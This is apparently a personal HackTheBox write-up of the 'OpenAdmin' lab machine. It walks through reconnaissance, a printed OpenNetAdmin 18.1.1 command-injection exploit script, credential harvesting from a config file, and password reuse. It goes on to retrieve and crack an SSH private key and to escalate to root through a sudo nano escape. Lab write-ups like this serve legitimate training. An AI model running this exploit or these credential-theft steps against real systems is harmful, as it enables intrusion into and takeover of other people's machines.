## Intro

tags: #linux #WebApp #known-binary #OSCPpath #easy 

-----
# Reconnaissance


```shell
source basher target1 10.129.53.234 [IP]
source basher host1 openadmin.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-09 09:59 -0400
Nmap scan report for 10.129.53.234
Host is up (0.11s latency).
Not shown: 59929 closed tcp ports (reset), 5604 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-09 10:00 -0400
Nmap scan report for openadmin.htb (10.129.53.234)
Host is up (0.063s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   65.40 ms 10.10.14.1
2   65.36 ms openadmin.htb (10.129.53.234)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## Directories

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```
found more directories:
```shell
music                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 51ms]
artwork                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 50ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 45ms]
sierra                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 71ms]
```
lets navigate to these pages too, going on the `music` one:
![](MediaFiles/Pasted%20image%2020260809172122.png)
i hit download, and redirected here, and we gain more info
![](MediaFiles/Pasted%20image%2020260809172311.png)
hitting dns domain shows `openadmin.htb`
also version is `v18.1.1`, but for what app? the answer found by clicking download which redirected here `http://openadmin.htb/ona/`
![](MediaFiles/Pasted%20image%2020260809172356.png)
so we need to search for `opennetadmin v18.1.1` exploits

---
# Foothold

## Vulnerable webapp version

```shell
└─$ searchsploit opennetadmin 18.1                                                                    
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)        | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                         | php/webapps/47691.sh
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
great! lets try the RCE one
```shell
└─$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/ch3ckm8/HTB/garfield/basher/47691.sh
```

```shell
└─$ cat 47691.sh                                                                                      
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

### Shell as www-data

```shell
└─$ ./47691.sh http://openadmin.htb/ona/                                                              
$ whoami
www-data
$ pwd
/opt/ona/www
```

## Filesystem enumeration

```shell
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ 
$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
#### creds obtained
mysql creds
```shell
ona_sys
n1nj4W4rri0R!
```

### user enumeration
```shell
$ ls /home
jimmy
joanna
```

## Shell as jimmy via password reuse

lets try the found password towards ssh for those 2 users
```shell
ssh jimmy@openadmin.htb                                                                                             
The authenticity of host 'openadmin.htb (10.129.53.234)' can't be established.
ED25519 key fingerprint is: SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'openadmin.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jimmy@openadmin.htb's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  9 14:35:20 UTC 2026

  System load:  0.0               Processes:             175
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 9%                IP address for ens160: 10.129.53.234
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```
worked for user jimmy, but the flag is not here, lets continue enumerating

### Filesystem enumeration

```shell
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```
We see that if we execute this script as the user specified in _/index.php_, it will cat the file _/home/joanna/.ssh/id_rsa_. In other words, it will return joanna’s ssh private key. Great!

Let’s look at the user mentioned in _/index.php_:
```php
           if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>

```
The expected user is jimmy, and it’s who we are at the moment. It also checks the hash of his password, which we also have.  
So, we must find a way to execute this script. After more and more enumeration, i found something interesting:
```shell
jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
There is a virtual host listening locally on the port 52846. We probably could use **netcat** here, but I used **curl** instead:

```shell
curl http://127.0.0.1:52846/main.php -u jimmy
```

```shell
Enter host password for user 'jimmy':
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

### RSA encrypted key found
we get joanna’s private key. The key is RSA encrypted (we just have the hash), and **JtR** (John the Ripper) can’t crack it. First, we have to change the format with **ssh2john**:
```shell
ssh2john id_rsa > id_rsa.txt 
```

### Hash cracking

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt
```

```shell
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)     
1g 0:00:11:15 DONE (2026-08-09 10:54) 0.001480g/s 14173p/s 14173c/s 14173C/s bloodofyouth..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### creds obtained

```shell
bloodninjas
```

## Shell as joanna

tried to login with that password but its wrong!
```shell
└─$ ssh joanna@openadmin.htb                                                                          
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
joanna@openadmin.htb's password: 
Permission denied, please try again.
joanna@openadmin.htb's password: 
```
then tried specifying the private key, after `chmod 600 id_rsa` and worked, grabbed user flag
```shell
└─$ ssh -i id_rsa openadmin.htb -l joanna                                                             
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  9 15:00:05 UTC 2026

  System load:  0.0               Processes:             181
  Usage of /:   31.0% of 7.81GB   Users logged in:       1
  Memory usage: 9%                IP address for ens160: 10.129.53.234
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ ls
user.txt                                                                                              
joanna@openadmin:~$ cat user.txt                                                                      
401c3aaba6491b6aa9fe40d7abeb2c39                                                                      
joanna@openadmin:~$      
```


---
# Privesc

## sudo -l

```shell
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:                                                    
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH       
    XUSERFILESEARCHPATH",                                                                             
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass       
                                                                                                      
User joanna may run the following commands on openadmin:                                              
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
We see that she can run nano as root

## Exploiting known binary

We’re now going to use **GTFOBins**. According to the Github repo,  is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

https://gtfobins.org/gtfobins/nano/
```shell
nano
^R^X
reset; sh 1>&0 2>&0
```
then just hit enter, then clear and got shell
## Shell as root

```shell
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@openadmin:/home/joanna# cd
root@openadmin:~# cat root.txt 
2bfbd2d25e2ffb27aee720ac4ab642cb
root@openadmin:~#
```

---
# Summary





-----
# Sidenotes

i am keeping the extensive enumeration part for initial access, and also the privesc with gtfo bins part